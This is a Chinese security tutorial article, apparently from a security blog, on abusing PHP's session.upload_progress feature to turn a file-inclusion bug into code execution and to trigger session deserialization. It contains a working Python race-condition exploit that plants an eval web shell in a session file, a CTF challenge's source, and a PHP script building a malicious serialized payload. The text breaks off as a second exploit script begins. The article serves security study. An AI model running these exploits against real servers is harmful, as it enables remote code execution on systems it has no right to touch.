								<!----> <!----></a> <span class="date" style="margin:0 15px" data-v-81187e68><i aria-label="图标: clock-circle" class="anticon anticon-clock-circle" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="clock-circle" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"></path><path d="M686.7 638.6L544.1 535.5V288c0-4.4-3.6-8-8-8H488c-4.4 0-8 3.6-8 8v275.4c0 2.6 1.2 5 3.3 6.5l165.4 120.6c3.6 2.6 8.6 1.8 11.2-1.7l28.6-39c2.6-3.7 1.8-8.7-1.8-11.2z"></path></svg></i>2019-05-17 10:00:30
							</span> <span class="review" style="margin-right:15px" data-v-81187e68><i aria-label="图标: fire" class="anticon anticon-fire" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="fire" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M834.1 469.2A347.49 347.49 0 0 0 751.2 354l-29.1-26.7a8.09 8.09 0 0 0-13 3.3l-13 37.3c-8.1 23.4-23 47.3-44.1 70.8-1.4 1.5-3 1.9-4.1 2-1.1.1-2.8-.1-4.3-1.5-1.4-1.2-2.1-3-2-4.8 3.7-60.2-14.3-128.1-53.7-202C555.3 171 510 123.1 453.4 89.7l-41.3-24.3c-5.4-3.2-12.3 1-12 7.3l2.2 48c1.5 32.8-2.3 61.8-11.3 85.9-11 29.5-26.8 56.9-47 81.5a295.64 295.64 0 0 1-47.5 46.1 352.6 352.6 0 0 0-100.3 121.5A347.75 347.75 0 0 0 160 610c0 47.2 9.3 92.9 27.7 136a349.4 349.4 0 0 0 75.5 110.9c32.4 32 70 57.2 111.9 74.7C418.5 949.8 464.5 959 512 959s93.5-9.2 136.9-27.3A348.6 348.6 0 0 0 760.8 857c32.4-32 57.8-69.4 75.5-110.9a344.2 344.2 0 0 0 27.7-136c0-48.8-10-96.2-29.9-140.9zM713 808.5c-53.7 53.2-125 82.4-201 82.4s-147.3-29.2-201-82.4c-53.5-53.1-83-123.5-83-198.4 0-43.5 9.8-85.2 29.1-124 18.8-37.9 46.8-71.8 80.8-97.9a349.6 349.6 0 0 0 58.6-56.8c25-30.5 44.6-64.5 58.2-101a240 240 0 0 0 12.1-46.5c24.1 22.2 44.3 49 61.2 80.4 33.4 62.6 48.8 118.3 45.8 165.7a74.01 74.01 0 0 0 24.4 59.8 73.36 73.36 0 0 0 53.4 18.8c19.7-1 37.8-9.7 51-24.4 13.3-14.9 24.8-30.1 34.4-45.6 14 17.9 25.7 37.4 35 58.4 15.9 35.8 24 73.9 24 113.1 0 74.9-29.5 145.4-83 198.4z"></path></svg></i>
							</span> <!----> <!----></div></div> <div class="artical-body" data-v-81187e68><div class="payread-panel" data-v-81187e68><div id="tinymce-editor" class="content-detail" data-v-81187e68><div><p><b style="color:#ef4747">*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</b></p><h2>前言</h2><p><b style="color:#00b050">本文主要是利用PHP中的<code>session.upload_progress</code>功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</b></p><h2>php中的session.upload_progress</h2><p>这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。</p><p>在php.ini有以下几个默认选项</p><pre><code><span style="padding-right:.1px">1. session.upload_progress.enabled = on</span><br><span style="padding-right:.1px">2. session.upload_progress.cleanup = on</span><br><span style="padding-right:.1px">3. session.upload_progress.prefix = "upload_progress_"</span><br><span style="padding-right:.1px">4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"</span><br><span style="padding-right:.1px">5. session.upload_progress.freq = "1%"</span><br><span style="padding-right:.1px">6. session.upload_progress.min_freq = "1"</span></code></pre><p>其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。</p><blockquote>    <p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>    <p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>    <p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>    <p><code>prefix+name</code>将表示为session中的键名</p></blockquote><h2>session相关配置及session反序列化</h2><p>因为这个不是本文的重点，所以这里附上几个相关链接。</p><blockquote>    <p><a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html">https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html</a></p>    <p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral</a></p></blockquote><p>另外，再添加个session配置中一个重要选项。</p><p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p><h2>利用session.upload_progress进行文件包含利用</h2><h3>测试环境</h3><blockquote>    <p>php5.5.38</p>    <p>win10</p>    <p>关于session相关的一切配置都是默认值</p></blockquote><h3>示例代码</h3><pre><code><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">&lt;?</span><span class="cm-variable" style="color:#000">php</span></span><br><span style="padding-right:.1px"><span class="cm-variable-2" style="color:#05a">$b</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-variable-2" style="color:#05a">$_GET</span>[<span class="cm-string" style="color:#a11">'file'</span>];</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">include</span> <span class="cm-string" style="color:#a11">"</span><span class="cm-variable-2" style="color:#05a">$b</span><span class="cm-string" style="color:#a11">"</span>;</span><br><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">?></span></span></code></pre><p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p><h3>分析</h3><p><b>问题一</b></p><p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p><p><b>解答一</b></p><p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p><p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。    </p><p><b>问题二</b></p><p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p><p><b>如何进行rce呢？</b></p><p><b>解答二</b></p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><h3>利用脚本</h3><pre><code><span style="padding-right:.1px"><span class="cm-comment" style="color:#a50">#coding=utf-8</span></span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">io</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">requests</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">threading</span></span><br><span style="padding-right:.1px"><span class="cm-variable" style="color:#000">sessid</span> = <span class="cm-string" style="color:#a11">'TGAO'</span></span><br><span style="padding-right:.1px"><span class="cm-variable" style="color:#000">data</span> = {<span class="cm-string" style="color:#a11">"cmd"</span>:<span class="cm-string" style="color:#a11">"system('whoami');"</span>}</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">def</span> <span class="cm-def" style="color:#00f">write</span>(<span class="cm-variable" style="color:#000">session</span>):</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">while</span> <span class="cm-keyword" style="color:#708">True</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">f</span> = <span class="cm-variable" style="color:#000">io</span>.<span class="cm-property" style="color:#000">BytesIO</span>(<span class="cm-string" style="color:#a11">b'a'</span> <span class="cm-operator" style="color:#981a1a">*</span> <span class="cm-number" style="color:#164">1024</span> <span class="cm-operator" style="color:#981a1a">*</span> <span class="cm-number" style="color:#164">50</span>)</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">resp</span> = <span class="cm-variable" style="color:#000">session</span>.<span class="cm-property" style="color:#000">post</span>( <span class="cm-string" style="color:#a11">'http://127.0.0.1:5555/test56.php'</span>, <span class="cm-variable" style="color:#000">data</span>={<span class="cm-string" style="color:#a11">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="cm-string" style="color:#a11">'&lt;?php eval($_POST["cmd"]);?>'</span>}, <span class="cm-variable" style="color:#000">files</span>={<span class="cm-string" style="color:#a11">'file'</span>: (<span class="cm-string" style="color:#a11">'tgao.txt'</span>,<span class="cm-variable" style="color:#000">f</span>)}, <span class="cm-variable" style="color:#000">cookies</span>={<span class="cm-string" style="color:#a11">'PHPSESSID'</span>: <span class="cm-variable" style="color:#000">sessid</span>} )</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">def</span> <span class="cm-def" style="color:#00f">read</span>(<span class="cm-variable" style="color:#000">session</span>):</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">while</span> <span class="cm-keyword" style="color:#708">True</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">resp</span> = <span class="cm-variable" style="color:#000">session</span>.<span class="cm-property" style="color:#000">post</span>(<span class="cm-string" style="color:#a11">'http://127.0.0.1:5555/test56.php?file=session/sess_'</span><span class="cm-operator" style="color:#981a1a">+</span><span class="cm-variable" style="color:#000">sessid</span>,<span class="cm-variable" style="color:#000">data</span>=<span class="cm-variable" style="color:#000">data</span>)</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">if</span> <span class="cm-string" style="color:#a11">'tgao.txt'</span> <span class="cm-keyword" style="color:#708">in</span> <span class="cm-variable" style="color:#000">resp</span>.<span class="cm-property" style="color:#000">text</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:#30a">print</span>(<span class="cm-variable" style="color:#000">resp</span>.<span class="cm-property" style="color:#000">text</span>)</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">event</span>.<span class="cm-property" style="color:#000">clear</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">else</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:#30a">print</span>(<span class="cm-string" style="color:#a11">"[+++++++++++++]retry"</span>)</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">if</span> <span class="cm-variable" style="color:#000">__name__</span>==<span class="cm-string" style="color:#a11">"__main__"</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">event</span>=<span class="cm-variable" style="color:#000">threading</span>.<span class="cm-property" style="color:#000">Event</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">with</span> <span class="cm-variable" style="color:#000">requests</span>.<span class="cm-property" style="color:#000">session</span>() <span class="cm-keyword" style="color:#708">as</span> <span class="cm-variable" style="color:#000">session</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">for</span> <span class="cm-variable" style="color:#000">i</span> <span class="cm-keyword" style="color:#708">in</span> <span class="cm-variable" style="color:#000">xrange</span>(<span class="cm-number" style="color:#164">1</span>,<span class="cm-number" style="color:#164">30</span>): </span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">threading</span>.<span class="cm-property" style="color:#000">Thread</span>(<span class="cm-variable" style="color:#000">target</span>=<span class="cm-variable" style="color:#000">write</span>,<span class="cm-variable" style="color:#000">args</span>=(<span class="cm-variable" style="color:#000">session</span>,)).<span class="cm-property" style="color:#000">start</span>()</span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">for</span> <span class="cm-variable" style="color:#000">i</span> <span class="cm-keyword" style="color:#708">in</span> <span class="cm-variable" style="color:#000">xrange</span>(<span class="cm-number" style="color:#164">1</span>,<span class="cm-number" style="color:#164">30</span>):</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">threading</span>.<span class="cm-property" style="color:#000">Thread</span>(<span class="cm-variable" style="color:#000">target</span>=<span class="cm-variable" style="color:#000">read</span>,<span class="cm-variable" style="color:#000">args</span>=(<span class="cm-variable" style="color:#000">session</span>,)).<span class="cm-property" style="color:#000">start</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">event</span>.<span class="cm-property" style="color:#000">set</span>()</span></code></pre><p>效果如下图</p><p><img alt="利用session.upload_progress进行文件包含和反序列化渗透" src="https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png!small" height="201" width="690"></p><h3>ctf题目</h3><p>在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。</p><pre><code><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">&lt;</span><span class="cm-variable" style="color:#000">html</span><span class="cm-operator" style="color:#981a1a">></span></span><br><span style="padding-right:.1px">    <span class="cm-operator" style="color:#981a1a">&lt;?</span><span class="cm-variable" style="color:#000">php</span></span><br><span style="padding-right:.1px">    <span class="cm-builtin" style="color:#30a">error_reporting</span>(<span class="cm-number" style="color:#164">0</span>);</span><br><span style="padding-right:.1px">    <span class="cm-variable-2" style="color:#05a">$file</span> <span class="cm-operator" style="color:#981a1a">=</span> <span class="cm-variable-2" style="color:#05a">$_GET</span>[<span class="cm-string" style="color:#a11">"file"</span>];</span><br><span style="padding-right:.1px">    <span class="cm-variable-2" style="color:#05a">$payload</span> <span class="cm-operator" style="color:#981a1a">=</span> <span class="cm-variable-2" style="color:#05a">$_GET</span>[<span class="cm-string" style="color:#a11">"payload"</span>];</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">if</span>(<span class="cm-operator" style="color:#981a1a">!</span><span class="cm-keyword" style="color:#708">isset</span>(<span class="cm-variable-2" style="color:#05a">$file</span>)){</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">echo</span> <span class="cm-string" style="color:#a11">'Missing parameter'</span>.<span class="cm-string" style="color:#a11">'&lt;br>'</span>;</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">if</span>(<span class="cm-builtin" style="color:#30a">preg_match</span>(<span class="cm-string" style="color:#a11">"/flag/"</span>,<span class="cm-variable-2" style="color:#05a">$file</span>)){</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">die</span>(<span class="cm-string" style="color:#a11">'hack attacked!!!'</span>);</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">    <span class="cm-variable" style="color:#000">@include</span>(<span class="cm-variable-2" style="color:#05a">$file</span>);</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">if</span>(<span class="cm-keyword" style="color:#708">isset</span>(<span class="cm-variable-2" style="color:#05a">$payload</span>)){</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$url</span> <span class="cm-operator" style="color:#981a1a">=</span> <span class="cm-builtin" style="color:#30a">parse_url</span>(<span class="cm-variable-2" style="color:#05a">$_SERVER</span>[<span class="cm-string" style="color:#a11">'REQUEST_URI'</span>]);</span><br><span style="padding-right:.1px">        <span class="cm-builtin" style="color:#30a">parse_str</span>(<span class="cm-variable-2" style="color:#05a">$url</span>[<span class="cm-string" style="color:#a11">'query'</span>],<span class="cm-variable-2" style="color:#05a">$query</span>);</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">foreach</span>(<span class="cm-variable-2" style="color:#05a">$query</span> <span class="cm-keyword" style="color:#708">as</span> <span class="cm-variable-2" style="color:#05a">$value</span>){</span><br><span style="padding-right:.1px">            <span class="cm-keyword" style="color:#708">if</span> (<span class="cm-builtin" style="color:#30a">preg_match</span>(<span class="cm-string" style="color:#a11">"/flag/"</span>,<span class="cm-variable-2" style="color:#05a">$value</span>)) {</span><br><span style="padding-right:.1px">                <span class="cm-keyword" style="color:#708">die</span>(<span class="cm-string" style="color:#a11">'stop hacking!'</span>);</span><br><span style="padding-right:.1px">                <span class="cm-keyword" style="color:#708">exit</span>();</span><br><span style="padding-right:.1px">            }</span><br><span style="padding-right:.1px">        }</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$payload</span> <span class="cm-operator" style="color:#981a1a">=</span> <span class="cm-builtin" style="color:#30a">unserialize</span>(<span class="cm-variable-2" style="color:#05a">$payload</span>);</span><br><span style="padding-right:.1px">    }<span class="cm-keyword" style="color:#708">else</span>{</span><br><span style="padding-right:.1px">       <span class="cm-keyword" style="color:#708">echo</span> <span class="cm-string" style="color:#a11">"Missing parameters"</span>;</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">    <span class="cm-operator" style="color:#981a1a">?></span></span><br><span style="padding-right:.1px">    <span class="cm-operator" style="color:#981a1a">&lt;!--</span><span class="cm-variable" style="color:#000">Please</span> <span class="cm-variable" style="color:#000">test</span> <span class="cm-variable" style="color:#000">index</span>.<span class="cm-variable" style="color:#000">php</span><span class="cm-operator" style="color:#981a1a">?</span><span class="cm-builtin" style="color:#30a">file</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-variable" style="color:#000">xxx</span>.<span class="cm-variable" style="color:#000">php</span> <span class="cm-operator" style="color:#981a1a">--></span></span><br><span style="padding-right:.1px">    <span class="cm-operator" style="color:#981a1a">&lt;!--</span><span class="cm-variable" style="color:#000">Please</span> <span class="cm-variable" style="color:#000">get</span> <span class="cm-variable" style="color:#000">the</span> <span class="cm-variable" style="color:#000">source</span> <span class="cm-variable" style="color:#000">of</span> <span class="cm-variable" style="color:#000">hint</span>.<span class="cm-variable" style="color:#000">php</span><span class="cm-operator" style="color:#981a1a">--></span></span><br><span style="padding-right:.1px">    <span class="cm-operator" style="color:#981a1a">&lt;/</span><span class="cm-variable" style="color:#000">html</span><span class="cm-operator" style="color:#981a1a">></span></span></code></pre><p>在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量<code>$file</code>加了过滤，不过没什么影响。</p><p>利用思路一样，这里就不再说了，网上也有相应的解法。</p><h3>小结</h3><p><b>利用条件</b></p><blockquote>    <p>1. 存在文件包含漏洞</p>    <p>2. 知道session文件存放路径，可以尝试默认路径</p>    <p>3. 具有读取和写入session文件的权限</p></blockquote><h2>利用session.upload_progress进行反序列化攻击</h2><h3>测试环境</h3><blockquote>    <p>php5.5.38</p>    <p>win10</p>    <p><code>session.serialize_handler=php_serialize</code><span style="color:#333">，其余session相关配置为默认值</span></p></blockquote><h3>示例代码</h3><pre><code><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">&lt;?</span><span class="cm-variable" style="color:#000">php</span></span><br><span style="padding-right:.1px"><span class="cm-builtin" style="color:#30a">error_reporting</span>(<span class="cm-number" style="color:#164">0</span>);</span><br><span style="padding-right:.1px"><span class="cm-variable" style="color:#000">date_default_timezone_set</span>(<span class="cm-string" style="color:#a11">"Asia/Shanghai"</span>);</span><br><span style="padding-right:.1px"><span class="cm-builtin" style="color:#30a">ini_set</span>(<span class="cm-string" style="color:#a11">'session.serialize_handler'</span>,<span class="cm-string" style="color:#a11">'php'</span>);</span><br><span style="padding-right:.1px"><span class="cm-builtin" style="color:#30a">session_start</span>();</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">class</span> <span class="cm-def" style="color:#00f">Door</span>{</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">public</span> <span class="cm-variable-2" style="color:#05a">$handle</span>;</span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">__construct</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">handle</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-keyword" style="color:#708">new</span> <span class="cm-variable" style="color:#000">TimeNow</span>();</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">__destruct</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">handle</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">action</span>();</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">}</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">class</span> <span class="cm-def" style="color:#00f">TimeNow</span> {</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">action</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">echo</span> <span class="cm-string" style="color:#a11">"你的访问时间:"</span>.<span class="cm-string" style="color:#a11">"</span>  <span class="cm-string" style="color:#a11">"</span>.<span class="cm-builtin" style="color:#30a">date</span>(<span class="cm-string" style="color:#a11">'Y-m-d H:i:s'</span>,<span class="cm-builtin" style="color:#30a">time</span>());</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">}</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">class</span>  <span class="cm-def" style="color:#00f">IP</span>{</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">public</span> <span class="cm-variable-2" style="color:#05a">$ip</span>;</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">__construct</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">ip</span> <span class="cm-operator" style="color:#981a1a">=</span> <span class="cm-string" style="color:#a11">'echo $_SERVER["REMOTE_ADDR"];'</span>;</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">action</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">eval</span>(<span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">ip</span>);</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">}</span><br><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">?></span></span></code></pre><h3>分析</h3><p><b>问题一</b></p><p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p><p><b>解答一</b></p><p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p><p>另外，与文件包含利用一样，也需要进行竞争。</p><h3>利用脚本</h3><p>首先利用exp.php脚本构造恶意序列化语句</p><pre><code><br><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">&lt;?</span><span class="cm-variable" style="color:#000">php</span></span><br><span style="padding-right:.1px"><span class="cm-builtin" style="color:#30a">ini_set</span>(<span class="cm-string" style="color:#a11">'session.serialize_handler'</span>, <span class="cm-string" style="color:#a11">'php_serialize'</span>);</span><br><span style="padding-right:.1px"><span class="cm-builtin" style="color:#30a">session_start</span>();</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">class</span> <span class="cm-def" style="color:#00f">Door</span>{</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">public</span> <span class="cm-variable-2" style="color:#05a">$handle</span>;</span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">__construct</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">handle</span> <span class="cm-operator" style="color:#981a1a">=</span> <span class="cm-keyword" style="color:#708">new</span> <span class="cm-variable" style="color:#000">IP</span>();</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">__destruct</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">handle</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">action</span>();</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">}</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">class</span> <span class="cm-def" style="color:#00f">TimeNow</span> {</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">action</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">echo</span> <span class="cm-string" style="color:#a11">"你的访问时间:"</span>.<span class="cm-string" style="color:#a11">"</span>  <span class="cm-string" style="color:#a11">"</span>.<span class="cm-builtin" style="color:#30a">date</span>(<span class="cm-string" style="color:#a11">'Y-m-d H:i:s'</span>,<span class="cm-builtin" style="color:#30a">time</span>());</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">}</span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">class</span>  <span class="cm-def" style="color:#00f">IP</span>{</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">public</span> <span class="cm-variable-2" style="color:#05a">$ip</span>;</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">__construct</span>() {</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-comment" style="color:#a50">//$this->ip='payload';</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">ip</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-string" style="color:#a11">'phpinfo();'</span>;</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-comment" style="color:#a50">//$this->ip='print_r(scandir('/'));';</span></span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">    <span class="cm-keyword" style="color:#708">function</span> <span class="cm-def" style="color:#00f">action</span>() {</span><br><span style="padding-right:.1px">        <span class="cm-keyword" style="color:#708">eval</span>(<span class="cm-variable-2" style="color:#05a">$this</span><span class="cm-operator" style="color:#981a1a">-></span><span class="cm-variable" style="color:#000">ip</span>);</span><br><span style="padding-right:.1px">    }</span><br><span style="padding-right:.1px">}</span><br><span style="padding-right:.1px"><span class="cm-variable-2" style="color:#05a">$a</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-keyword" style="color:#708">new</span> <span class="cm-variable" style="color:#000">Door</span>();</span><br><span style="padding-right:.1px"><span class="cm-variable-2" style="color:#05a">$b</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-builtin" style="color:#30a">serialize</span>(<span class="cm-variable-2" style="color:#05a">$a</span>);</span><br><span style="padding-right:.1px"><span class="cm-variable-2" style="color:#05a">$c</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-builtin" style="color:#30a">addslashes</span>(<span class="cm-variable-2" style="color:#05a">$b</span>);</span><br><span style="padding-right:.1px"><span class="cm-variable-2" style="color:#05a">$d</span><span class="cm-operator" style="color:#981a1a">=</span><span class="cm-builtin" style="color:#30a">str_replace</span>(<span class="cm-string" style="color:#a11">"O:4:"</span>,<span class="cm-string" style="color:#a11">"|O:4:"</span>,<span class="cm-variable-2" style="color:#05a">$c</span>);</span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">echo</span> <span class="cm-variable-2" style="color:#05a">$d</span>;</span><br><span style="padding-right:.1px"><span class="cm-operator" style="color:#981a1a">?></span></span></code></pre><p>其此利用exp.py脚本进行竞争</p><pre><code><span style="padding-right:.1px"><span class="cm-comment" 